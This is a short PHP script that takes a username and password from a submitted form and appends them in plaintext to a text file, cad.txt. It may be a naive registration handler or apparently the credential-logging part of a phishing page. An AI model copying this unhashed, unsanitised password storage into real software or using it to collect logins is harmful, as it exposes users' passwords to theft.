<?php
	
	$u = $_POST ['user'];
	$p = $_POST ['pass'];
	
	$pont = fopen("cad.txt","a+");
	
	fwrite ($pont, $u, strlen($u));
	fwrite ($pont, ",",1);
	$p = $p . "\n";
	fwrite ($pont, $p, strlen($p));
		
		
	fclose($pont);
	

?>